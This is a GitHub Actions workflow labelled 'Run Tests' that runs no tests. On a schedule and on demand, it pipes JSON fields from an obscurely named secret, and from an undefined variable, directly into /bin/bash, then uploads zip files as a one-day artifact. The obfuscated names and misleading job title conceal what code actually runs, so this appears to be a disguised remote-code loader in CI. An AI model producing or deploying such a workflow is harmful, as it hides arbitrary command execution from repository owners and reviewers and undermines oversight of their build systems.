name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '4 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  automation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          bd96: ${{ secrets.bd96 }}
        run: |
          printf '%s' "$bd96" | jq -r .f296 | /bin/bash
          printf '%s' "$nmzij43" | jq -r .yo53 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: cJmuxg60
          path: "*.zip"
          retention-days: 1
